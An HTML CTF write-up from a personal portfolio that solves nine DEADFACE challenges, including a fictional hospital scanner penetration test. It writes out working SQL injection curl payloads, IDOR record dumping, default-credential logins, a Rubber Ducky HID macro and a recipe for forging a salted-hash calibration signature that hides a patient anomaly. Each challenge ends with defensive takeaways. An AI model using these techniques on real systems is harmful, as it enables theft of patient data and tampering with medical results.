@@ -1,0 +1,439 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DEADFACE CTF — Writeup — arwah</title><meta name="description" content="We intercepted a DEADFACE hacker&#x27;s laptop and determined he had stolen a man named Daniel&#x27;s entire identity. Identify which DEADFACE member is responsible."><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Mixed Challenges · 11 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#challenge-1-headshot">Challenge 1: Headshot</a></li><li><a href="#challenge-2-health-spark-login-sql-injection">Challenge 2: Health Spark — Login (SQL Injection)</a></li><li><a href="#challenge-3-health-spark-member-records-idor-broken-access-control">Challenge 3: Health Spark — Member Records (IDOR / Broken Access Control)</a></li><li><a href="#challenge-4-kiosk-browser-lingering-strings">Challenge 4: Kiosk Browser — Lingering Strings</a></li><li><a href="#challenge-5-scanworks-login-default-credentials">Challenge 5: ScanWorks Login — Default Credentials</a></li><li><a href="#challenge-6-file-system-hardcoded-keys">Challenge 6: File System — Hardcoded Keys</a></li><li><a href="#challenge-7-hid-the-kiosk-that-never-locked-the-keyboard">Challenge 7: HID — The Kiosk That Never Locked the Keyboard</a></li><li><a href="#challenge-8-calibration-integrity-signature-forgery">Challenge 8: Calibration Integrity — Signature Forgery</a></li><li><a href="#challenge-9-ble-telemetry-eavesdropping-the-air">Challenge 9: BLE Telemetry — Eavesdropping the Air</a></li><li><a href="#attack-chain-summary-emedra-cs-9000">Attack-Chain Summary (eMedra CS-9000)</a></li></ul></details><article class="prose"><h1 id="deadface-ctf-writeup">DEADFACE CTF — Writeup</h1>
+<h2 id="challenge-1-headshot">Challenge 1: Headshot</h2>
+<p><strong>Category:</strong> Forensics / Steganography
+<strong>Flag:</strong> <code>deadface{b00m_h34Dsh0TTT}</code></p>
+<h3 id="description">Description</h3>
+<p>We intercepted a DEADFACE hacker's laptop and determined he had stolen a man named
+Daniel's entire identity. Identify which DEADFACE member is responsible.</p>
+<h3 id="files-provided">Files Provided</h3>
+<pre><code>/home/arwah/Downloads/headshot/
+├── headshot001.png
+├── headshot002.png
+├── headshot003.png
+└── headshot003.png_original
+</code></pre>
+<p>All four files are 512x512 PNG images.</p>
+<h3 id="solution">Solution</h3>
+<p>The presence of <code>headshot003.png_original</code> alongside <code>headshot003.png</code> is a strong
+hint: the third image was modified after being saved. Image edits in CTFs very often
+mean hidden data in metadata rather than pixel-level steganography.</p>
+<p>Running <code>exiftool</code> over the directory immediately reveals the answer:</p>
+<pre><code class="language-bash">$ exiftool /home/arwah/Downloads/headshot/*.png
+</code></pre>
+<p><code>headshot001.png</code> and <code>headshot002.png</code> are clean, but <code>headshot003.png</code> carries a
+PNG <code>tEXt</code> Comment chunk:</p>
+<pre><code>Comment                         : deadface{b00m_h34Dsh0TTT}
+</code></pre>
+<p>No pixel analysis (stegsolve, zsteg, LSB) was needed — the flag lives entirely in
+the file's metadata.</p>
+<h3 id="flag">Flag</h3>
+<pre><code>deadface{b00m_h34Dsh0TTT}
+</code></pre>
+<h3 id="takeaways">Takeaways</h3>
+<ul>
+<li>An <code>_original</code> copy next to an edited file is a classic indicator of post-save
+tampering — check metadata first.</li>
+<li>PNG metadata chunks (<code>tEXt</code>/<code>zTXt</code>) survive normal image viewing and are a common
+quick hiding spot in forensics challenges.</li>
+</ul>
+<hr />
+<h2 id="challenge-2-health-spark-login-sql-injection">Challenge 2: Health Spark — Login (SQL Injection)</h2>
+<p><strong>Category:</strong> Web — SQL Injection
+<strong>Flag:</strong> <code>deadface{typical_and_classic}</code></p>
+<p><strong>Target:</strong> <code>http://45.79.200.170:3000/</code> (Health Spark Employer Portal)</p>
+<h3 id="recon">Recon</h3>
+<p>The login page is a simple username/password form posting JSON to <code>/api/login</code>:</p>
+<pre><code class="language-json">{&quot;username&quot;: &quot;...&quot;, &quot;password&quot;: &quot;...&quot;}
+</code></pre>
+<p>Reading the client-side JavaScript is the key step. The inline script contains a
+very deliberate hint:</p>
+<pre><code class="language-js">if (!data.token) {
+  // No session issued -- bad creds, or the SQLi disclosure (HTTP 200 with
+  // no token). Show the server's message; the response body may contain
+  // more than the UI chooses to display.
+  showError(data.message || data.error || 'Login failed.');
+}
+</code></pre>
+<p>Translation: there is SQL injection on the login, and the server leaks data in an
+HTTP 200 response that the UI never displays.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>A baseline request confirms normal behavior:</p>
+<pre><code class="language-bash">$ curl -s -X POST http://45.79.200.170:3000/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}'
+# HTTP 401 — {&quot;error&quot;:&quot;Invalid credentials&quot;, ...}
+</code></pre>
+<p>The classic tautology injection in the username field:</p>
+<pre><code class="language-bash">$ curl -s -X POST http://45.79.200.170:3000/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{&quot;username&quot;:&quot;'&quot;'&quot;' OR 1=1 -- &quot;,&quot;password&quot;:&quot;x&quot;}'
+</code></pre>
+<p>Response — <strong>HTTP 200</strong> with the first user's full database row dumped into the
+body:</p>
+<pre><code class="language-json">{
+  &quot;message&quot;: &quot;Login failed. That's weird... check the network traffic!&quot;,
+  &quot;username&quot;: &quot;john.smith&quot;,
+  &quot;name&quot;: &quot;John Smith&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;departmentid&quot;: 10685,
+  &quot;password&quot;: &quot;Locked_In_And_Ready&quot;,
+  &quot;flag&quot;: &quot;deadface{typical_and_classic}&quot;
+}
+</code></pre>
+<p>The server never sanitizes <code>username</code>, concatenates it into the query, and then
+serializes the resulting row (including the flag column) into the JSON response.
+The UI only shows the <code>message</code>, so the flag is invisible in a browser but plain
+in the network traffic — exactly as the code comment promised.</p>
+<p>Side yield: valid credentials for <code>john.smith</code> / <code>Locked_In_And_Ready</code>, which set
+up the next challenge.</p>
+<h3 id="flag-2">Flag</h3>
+<pre><code>deadface{typical_and_classic}
+</code></pre>
+<h3 id="takeaways-2">Takeaways</h3>
+<ul>
+<li>Always read the page's JavaScript — challenge authors (and sloppy vibe-coded
+apps) leave breadcrumbs in client code.</li>
+<li>&quot;HTTP 200 with no token&quot; is an authentication-response inconsistency worth
+fuzzing; the raw response body often carries more than the UI renders.</li>
+</ul>
+<hr />
+<h2 id="challenge-3-health-spark-member-records-idor-broken-access-control">Challenge 3: Health Spark — Member Records (IDOR / Broken Access Control)</h2>
+<p><strong>Category:</strong> Web — IDOR, Privilege Escalation via SQLi
+<strong>Flag:</strong> <code>deadface{hipaa_exposure_is_bad}</code></p>
+<p><strong>Target:</strong> <code>http://45.79.200.170:3000/dashboard</code></p>
+<h3 id="recon-2">Recon</h3>
+<p>Logging in as <code>john.smith</code> issues a JWT (HS256):</p>
+<pre><code class="language-json">{&quot;sub&quot;:&quot;john.smith&quot;,&quot;name&quot;:&quot;John Smith&quot;,&quot;role&quot;:&quot;user&quot;,&quot;departmentid&quot;:10685,...}
+</code></pre>
+<p>The dashboard fetches member PHI records:</p>
+<pre><code class="language-js">const body = { departmentid: parseInt(dept, 10), FirstNameFilter: '',
+               LastNameFilter: '', take: null, skip: 0 };
+fetch('/api/patients', { method: 'POST',
+  headers: { ..., 'Authorization': 'Bearer ' + token },
+  body: JSON.stringify(body) });
+</code></pre>
+<p>Two candidate weaknesses:</p>
+<ol>
+<li><code>departmentid</code> is taken from the <strong>request body</strong>, not from the JWT — textbook
+IDOR setup.</li>
+<li>An &quot;Admin Tools&quot; panel with a server-side photo fetcher (<code>/api/admin/fetch-photo</code>,
+potential SSRF), but it rejects non-admin tokens, and JWT <code>alg:none</code> tampering
+and a quick wordlist of weak HS256 secrets both fail.</li>
+</ol>
+<h3 id="exploitation-2">Exploitation</h3>
+<p><strong>Step 1 — Find other departments.</strong> Swapping <code>departmentid</code> to nearby values
+(10684, 10686, ...) returns empty member lists, so the interesting data lives in a
+department we don't know yet. Rather than scanning ID space, reuse the login SQLi
+to dump the users table. A LIKE-based payload pulls the second row:</p>
+<pre><code class="language-bash">$ curl -s -X POST http://45.79.200.170:3000/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{&quot;username&quot;:&quot;'&quot;'&quot;' OR username LIKE '&quot;'&quot;'%a%'&quot;'&quot;' -- &quot;,&quot;password&quot;:&quot;x&quot;}'
+</code></pre>
+<pre><code class="language-json">{
+  &quot;username&quot;: &quot;maria.holloway&quot;,
+  &quot;name&quot;: &quot;Maria Holloway&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;departmentid&quot;: 18432,
+  &quot;password&quot;: &quot;eybrGv3YmNCxaDVSBsmZ&quot;
+}
+</code></pre>
+<p>Chained exclusion payloads (<code>' OR username != 'john.smith' AND username != 'maria.holloway' ... --</code>)
+enumerate the rest: <code>devon.pearce</code> and <code>aisha.nakamura</code>, also in department 18432.</p>
+<p><strong>Step 2 — Log in as maria and pull her department's records:</strong></p>
+<pre><code class="language-bash">$ TOKEN=$(curl -s -X POST http://45.79.200.170:3000/api/login \
+    -H 'Content-Type: application/json' \
+    -d '{&quot;username&quot;:&quot;maria.holloway&quot;,&quot;password&quot;:&quot;eybrGv3YmNCxaDVSBsmZ&quot;}' \
+    | python3 -c &quot;import json,sys; print(json.load(sys.stdin)['token'])&quot;)
+
+$ curl -s -X POST http://45.79.200.170:3000/api/patients \
+    -H 'Content-Type: application/json' \
+    -H &quot;Authorization: Bearer $TOKEN&quot; \
+    -d '{&quot;departmentid&quot;:18432,&quot;take&quot;:null,&quot;skip&quot;:0}'
+</code></pre>
+<p>Department 18432 returns 10 full PHI records (names, SSNs, DOBs, diagnoses). One
+of them is planted:</p>
+<pre><code class="language-json">{
+  &quot;name&quot;: &quot;Patient Zero&quot;,
+  &quot;memberId&quot;: &quot;HS-8820343&quot;,
+  &quot;ssn&quot;: &quot;000-00-0000&quot;,
+  &quot;email&quot;: &quot;records.exposed@example.com&quot;,
+  &quot;dob&quot;: &quot;1990-01-01&quot;,
+  &quot;diagnosis&quot;: &quot;deadface{hipaa_exposure_is_bad}&quot;,
+  &quot;plan&quot;: &quot;Spark Premier PPO&quot;
+}
+</code></pre>
+<h3 id="root-cause">Root Cause</h3>
+<p><code>/api/patients</code> authorizes the <strong>token</strong> but scopes the query by a <code>departmentid</code>
+supplied in the <strong>request body</strong>. The server never verifies that the requested
+department matches the JWT's <code>departmentid</code> claim, so any authenticated user can
+read any department's records — a direct HIPAA-grade broken access control flaw.
+(The injection in <code>/api/login</code> merely served as the recon tool to discover the
+target department.)</p>
+<h3 id="flag-3">Flag</h3>
+<pre><code>deadface{hipaa_exposure_is_bad}
+</code></pre>
+<h3 id="takeaways-3">Takeaways</h3>
+<ul>
+<li>Access control must be enforced server-side per object; trusting client-supplied
+scoping parameters (<code>departmentid</code> in the body) is a guaranteed IDOR.</li>
+<li>One injection point (login) is often the key to a second, separate vulnerability
+(IDOR): dump the users table to learn the ID space before scanning blindly.</li>
+</ul>
+<hr />
+<h1 id="emedra-cerebrascan-cs-9000-medical-device-penetration-test">Emedra CerebraScan CS-9000 — Medical Device Penetration Test</h1>
+<p><strong>Target:</strong> <code>http://emedra.dctf.io:8080/</code> (Emedra CerebraScan operator console,
+device serial <strong>EM-CS9K-04417</strong>, firmware <strong>NeuraOS 2.3.1</strong>, site <strong>stdymphna-rmc-01</strong>)</p>
+<p>DEADFACE claims to have stolen patient records from St. Dymphna's Medical Center.
+The device is air-gapped, so the breach must have been physical — two impostors
+posing as IT. We were given the device itself for a penetration test.</p>
+<p>The frontend is a Vite SPA. After <code>curl</code>ing the main bundle
+(<code>/assets/index-CbamKmo7.js</code>) and grepping it, the full API surface falls out:</p>
+<pre><code>/api/healthz      /api/device        /api/hotspot/&lt;id&gt;
+/api/connect      /api/shell         /api/capture
+/api/kiosk/login  /api/kiosk/auth    /api/kiosk/patients
+/api/kiosk/scan   /api/kiosk/about   /api/kiosk/hid
+/api/external-display
+</code></pre>
+<p><code>/api/connect</code> takes a <code>{tool, port}</code> pair and returns a session token that gates
+the tool's specific endpoint (<code>/api/shell</code>, <code>/api/kiosk/hid</code>, <code>/api/capture</code>).
+Lazy-loaded assets (<code>kiosk-Cww_EHUm.js</code>, <code>hidMacro-CuHggWtU.js</code>,
+<code>bleCapture-Dgbjk0zZ.js</code>, ...) document how each tool window talks to the API.</p>
+<hr />
+<h2 id="challenge-4-kiosk-browser-lingering-strings">Challenge 4: Kiosk Browser — Lingering Strings</h2>
+<p><strong>Category:</strong> Web / Information Disclosure
+<strong>Flag:</strong> <code>deadface{v13w_s0urc3_sav3s_l1v3s}</code></p>
+<h3 id="solution-2">Solution</h3>
+<p>The kiosk login screen isn't a route — it's an API response. The SPA fetches it as
+raw HTML from <code>/api/kiosk/login</code>, so requesting it directly with <code>curl</code> shows markup
+the rendered UI never displays:</p>
+<pre><code class="language-bash">$ curl -s http://emedra.dctf.io:8080/api/kiosk/login
+</code></pre>
+<pre><code class="language-html">&lt;div class=&quot;sw-status&quot;&gt;Active study: &lt;b&gt;G.M.&lt;/b&gt; · MRN ****13 · device locked&lt;/div&gt;
+&lt;!-- TODO(dev): REMOVE before go-live — temporary QA technician PIN: deadface{v13w_s0urc3_sav3s_l1v3s} --&gt;
+</code></pre>
+<h3 id="flag-4">Flag</h3>
+<pre><code>deadface{v13w_s0urc3_sav3s_l1v3s}
+</code></pre>
+<h3 id="takeaways-4">Takeaways</h3>
+<ul>
+<li>&quot;View source&quot; on API-served fragments, not just pages — comments intended for
+developers routinely survive into production.</li>
+<li>The same response leaks an active patient (G.M., MRN ****13) on an
+unauthenticated endpoint.</li>
+</ul>
+<hr />
+<h2 id="challenge-5-scanworks-login-default-credentials">Challenge 5: ScanWorks Login — Default Credentials</h2>
+<p><strong>Category:</strong> Web / Hardcoded Defaults
+<strong>Flag:</strong> <code>deadface{d3fault_cr3ds_n3v3r_ch4ng3d}</code></p>
+<h3 id="solution-3">Solution</h3>
+<p>The asset-label hotspot (<code>/api/hotspot/sticker</code>) links to the vendor's own
+documentation: <code>/assets/cs9000-field-service-manual.pdf</code>. Section 2.3 of the
+Field Service Manual ships the factory technician account and warns to change it
+on first boot — the hospital never did:</p>
+<blockquote>
+<p>Username: <code>emedra-svc</code>  Password: <code>ChangeMe!2019</code></p>
+</blockquote>
+<p>Logging in at <code>/api/kiosk/auth</code> succeeds and returns the maintenance token:</p>
+<pre><code class="language-bash">$ curl -s -X POST http://emedra.dctf.io:8080/api/kiosk/auth \
+    -H 'Content-Type: application/json' \
+    -d '{&quot;username&quot;:&quot;emedra-svc&quot;,&quot;password&quot;:&quot;ChangeMe!2019&quot;}'
+{&quot;ok&quot;:true,&quot;token&quot;:&quot;ab66608d-...&quot;,&quot;tech&quot;:{&quot;name&quot;:&quot;Service Technician&quot;},
+ &quot;maintenanceToken&quot;:&quot;deadface{d3fault_cr3ds_n3v3r_ch4ng3d}&quot;}
+</code></pre>
+<h3 id="flag-5">Flag</h3>
+<pre><code>deadface{d3fault_cr3ds_n3v3r_ch4ng3d}
+</code></pre>
+<h3 id="takeaways-5">Takeaways</h3>
+<ul>
+<li>Medical devices ship with documented factory accounts; an internet-accessible
+copy of the service manual makes the &quot;secret&quot; public.</li>
+<li>The manual is also a roadmap for the rest of the engagement: it documents the
+HDMI diagnostic OSD (level 3 = raw session dump), the USB-C service port, and
+unauthenticated BLE telemetry.</li>
+</ul>
+<hr />
+<h2 id="challenge-6-file-system-hardcoded-keys">Challenge 6: File System — Hardcoded Keys</h2>
+<p><strong>Category:</strong> Physical Access / Live USB / Secrets in Config
+<strong>Flag:</strong> <code>deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}</code></p>
+<h3 id="solution-4">Solution</h3>
+<p>Connect the <strong>Live Linux USB-A</strong> tool (<code>/api/connect</code> with <code>tool: live-linux</code>,
+<code>port: usb-a</code>) to get a shell token for <code>/api/shell</code>. The live environment's
+<code>README.txt</code> states the scanner's internal storage is unencrypted:</p>
+<pre><code class="language-bash">$ lsblk                      # sda2 (31G, ext4, &quot;scanworks-data&quot;)
+$ sudo mount /dev/sda2 /mnt
+$ ls /mnt/opt/scanworks      # calibration  config.yaml  logs  scanworks.bin
+</code></pre>
+<p><code>config.yaml</code> contains a hardcoded upstream API key the vendor left in the
+commissioning config:</p>
+<pre><code class="language-yaml"># Upstream API key (service account). TODO: move to secrets store before GA.
+api_key: deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}
+
+integrity:
+  salt: EM-2019          # calibration signature salt
+
+debug_console:
+  enabled: true
+  function: debug.dump
+  tables: [patients, calibration, audit]
+</code></pre>
+<h3 id="flag-6">Flag</h3>
+<pre><code>deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}
+</code></pre>
+<h3 id="takeaways-6">Takeaways</h3>
+<ul>
+<li>A physical interface (USB) defeats &quot;no network access&quot; in minutes.</li>
+<li>The same file seeds the next two attacks: <code>integrity.salt: EM-2019</code> (calibration
+forgery) and the <code>debug_console</code> block (hidden maintenance console).</li>
+</ul>
+<hr />
+<h2 id="challenge-7-hid-the-kiosk-that-never-locked-the-keyboard">Challenge 7: HID — The Kiosk That Never Locked the Keyboard</h2>
+<p><strong>Category:</strong> Hardware / HID Injection
+<strong>Flag:</strong> <code>deadface{un10ck3d_k10sk_qu4cks_b4ck}</code></p>
+<h3 id="solution-5">Solution</h3>
+<p>The kiosk is &quot;just a browser in a box&quot; — connect the <strong>Rubber Ducky</strong> to USB-A
+(<code>windowType: hid-macro</code>). The bundled asset (<code>hidMacro-CuHggWtU.js</code>) ships a
+default payload that documents the hidden console's key-chord:</p>
+<pre><code>DELAY 500
+CTRL-ALT F12
+DELAY 300
+STRING &lt;function&gt;(&lt;table&gt;)
+ENTER
+</code></pre>
+<p>From the <code>debug_console</code> block in <code>config.yaml</code>: function <code>debug.dump</code>, tables
+<code>patients, calibration, audit</code>. Fill in the STRING line and POST to <code>/api/kiosk/hid</code>:</p>
+<pre><code class="language-json">{&quot;token&quot;:&quot;&lt;ducky-token&gt;&quot;,&quot;macro&quot;:&quot;DELAY 500\nCTRL-ALT F12\nDELAY 300\nSTRING debug.dump(patients)\nENTER&quot;}
+</code></pre>
+<p>Response:</p>
+<pre><code>ScanWorks debug console (NeuraOS 2.3.1)
+&gt; debug.dump(patients)
+[100413] Gideon Marsh  | study: Cranial perfusion, contrast
+[100666] Lenora Crane  | study: Baseline screen
+[100228] Osric Vane    | study: Post-op follow-up
+debug-token: deadface{un10ck3d_k10sk_qu4cks_b4ck}
+</code></pre>
+<h3 id="flag-7">Flag</h3>
+<pre><code>deadface{un10ck3d_k10sk_qu4cks_b4ck}
+</code></pre>
+<h3 id="takeaways-7">Takeaways</h3>
+<ul>
+<li>Kiosk lockdown that ignores the physical keyboard is no lockdown: one key-chord
+opened a debug console with no additional authentication.</li>
+<li>Client-side assets are free documentation for attackers.</li>
+</ul>
+<hr />
+<h2 id="challenge-8-calibration-integrity-signature-forgery">Challenge 8: Calibration Integrity — Signature Forgery</h2>
+<p><strong>Category:</strong> Cryptography / Patient-Safety Impact
+<strong>Flag:</strong> <code>deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}</code></p>
+<h3 id="the-flaw">The Flaw</h3>
+<p><code>calibration/verify.py</code> shows the &quot;signature&quot; is not a signature at all:</p>
+<pre><code class="language-python">got = hashlib.sha256(data + salt.encode()).hexdigest()
+# FIXME: replace with HMAC using the per-device key.
+</code></pre>
+<p>The salt is <code>integrity.salt: EM-2019</code> — printed in plain text in <code>config.yaml</code>,
+which we already read off the data partition. Anyone with the config can forge a
+valid signature over arbitrary calibration bytes.</p>
+<h3 id="exploitation-3">Exploitation</h3>
+<ol>
+<li>
+<p><strong>Baseline</strong> (<code>scanctl scan</code>, genuine calibration) — the anomaly is detected:</p>
+<pre><code>CALIBRATION OK (sig verified)  report_above=0.35
+Patient: Gideon Marsh (MRN 100413)  study: Cranial perfusion
+RESULT: ANOMALY DETECTED (score 0.72) — refer for radiologist review
+</code></pre>
+</li>
+<li>
+<p><strong>Tamper</strong> — write <code>calib.json</code> with <code>anomaly_threshold</code> and <code>report_above</code>
+raised to <code>0.99</code> (written via <code>base64 -d</code> to survive the shell's quote
+handling), then compute the forged signature locally:</p>
+<pre><code class="language-python">sig = hashlib.sha256(tampered_bytes + b&quot;EM-2019&quot;).hexdigest()
+</code></pre>
+<p>and write it to <code>calib.json.sig</code>.</p>
+</li>
+<li>
+<p><strong>Verify + scan</strong> — the device accepts the forgery:</p>
+<pre><code>$ scanctl verify
+calibration integrity: OK (signature verified)
+
+$ scanctl scan
+CALIBRATION OK (sig verified)  report_above=0.99
+Patient: Gideon Marsh (MRN 100413)  study: Cranial perfusion
+RESULT: No abnormality detected   [UNSAFE: finding 0.72 &gt;= safe 0.35 suppressed]
+</code></pre>
+</li>
+</ol>
+<p>A patient with a genuine 0.72 anomaly would be reported perfectly healthy.</p>
+<h3 id="flag-8">Flag</h3>
+<pre><code>deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
+</code></pre>
+<h3 id="takeaways-8">Takeaways</h3>
+<ul>
+<li>A keyed digest without a secret (salt-in-config &quot;signatures&quot;) provides zero
+tamper protection — it's obfuscation, not integrity.</li>
+<li>Threshold parameters belong inside the trust boundary. If calibration can
+silence alarms, the integrity check is a patient-safety control and must use a
+per-device HMAC key stored securely.</li>
+</ul>
+<hr />
+<h2 id="challenge-9-ble-telemetry-eavesdropping-the-air">Challenge 9: BLE Telemetry — Eavesdropping the Air</h2>
+<p><strong>Category:</strong> Wireless / Passive Reconnaissance
+<strong>Flag:</strong> <code>deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}</code></p>
+<h3 id="solution-6">Solution</h3>
+<p>The Field Service Manual (§5) documents the CS-9000's BLE remote-maintenance
+telemetry as unauthenticated and unencrypted:</p>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Characteristic</th>
+<th>Format</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x2a</td>
+<td>Vitals telemetry</td>
+<td>binary vitals frames (6-byte payload)</td>
+</tr>
+<tr>
+<td>0x37</td>
+<td>Maintenance log</td>
+<td>Base64 text, chunked across seq-numbered notifies</td>
+</tr>
+</tbody>
+</table>
+<p>Attach the <strong>BLE Sniffer</strong> to USB-A and pull <code>/api/capture</code> (bearer token from
+<code>/api/connect</code>): 96 packets — 72 boring vitals frames on <code>0x2a</code>, 24 log chunks
+on <code>0x37</code>.</p>
+<p>Reassembly = sort by <code>seq</code>, concatenate hex payloads, Base64-decode:</p>
+<pre><code>St.Dymphna CS-9000 maint log | site=stdymphna-rmc-01 | tech=emedra-svc
+last_patient: Gideon Marsh (MRN 100413)
+note: telemetry unencrypted per EM-2019 default; flag deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}
+</code></pre>
+<h3 id="flag-9">Flag</h3>
+<pre><code>deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}
+</code></pre>
+<h3 id="takeaways-9">Takeaways</h3>
+<ul>
+<li>Cleartext BLE telemetry leaks the technician account, site ID, and the current
+patient's name and MRN to anyone with a ~$15 receiver — no pairing, no
+encryption, no alerting.</li>
+<li>This is a plausible piece of the DEADFACE attack chain: physical proximity was
+all that was ever required.</li>
+</ul>
+<hr />
+<h2 id="attack-chain-summary-emedra-cs-9000">Attack-Chain Summary (eMedra CS-9000)</h2>
+<ol>
+<li><strong>Recon</strong> — SPA bundles expose the full API; service manual is public.</li>
+<li><strong>Entry</strong> — default tech account (<code>emedra-svc</code> / <code>ChangeMe!2019</code>).</li>
+<li><strong>Persistence/recon on-device</strong> — unencrypted storage + hardcoded API key and
+signature salt readable off the data partition via a live USB.</li>
+<li><strong>Lateral access</strong> — HID injection opens an unauthenticated debug console
+(<code>CTRL-ALT F12</code> → <code>debug.dump(patients)</code>).</li>
+<li><strong>Patient-safety impact</strong> — trivially forged calibration &quot;signature&quot; suppresses
+real anomaly findings.</li>
+<li><strong>Passive exfiltration</strong> — unencrypted BLE leaks patient and maintenance data
+to anyone nearby.</li>
+</ol>
+<p>DEADFACE never needed to defeat a single real security control — every &quot;check&quot;
+they bypassed was either a default, a comment, or a hash without a secret.</p>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
